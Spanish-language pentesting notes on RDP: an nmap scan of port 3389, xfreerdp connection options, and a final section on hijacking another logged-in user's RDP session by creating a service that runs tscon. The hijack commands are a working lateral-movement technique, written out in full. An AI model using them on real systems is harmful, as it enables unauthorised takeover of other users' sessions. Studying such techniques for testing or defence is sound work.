# Info
Usualmente está alojado en el puerto 3389

#### Recon con nmap
nmap -Pn -p3389 192.168.2.143 


# Conectarse:
### Desde windows:

    mstsc.exe

### Desde linux

##### REMOTE DESK CONECTION

    xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution

##### Para compartir una carpeta
    xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution +clipboard /drive:SHARE,/path/shared 

##### Si queremos mejorar la conexión optimizando 

    xfreerdp /u:(username) /p:(password) /v:(Machine IP) /dynamic-resolution +clipboard /drive:SHARE,/path/shared /bpp:8 /compression -themes -wallpaper /clipboard /audio-mode:0 /auto-reconnect -glyph-cache


---

# Impersonar un usuario conectado por rdp:
Necesitamos tener privilegios de administrador.

primero vemos si hay otro usuario conectado:

    query user

creamos un servicio:

    sc.exe create sessionhijack binpath= "cmd.exe /k tscon <user_id_a_impersonar> /dest:<nuestra_sesion>"

luego iniciamos el servicio y se va a abrir un cmd con la sesión del usuario:

    net start sessionhijack



0E14B9D6330BF16C30B1924111104824
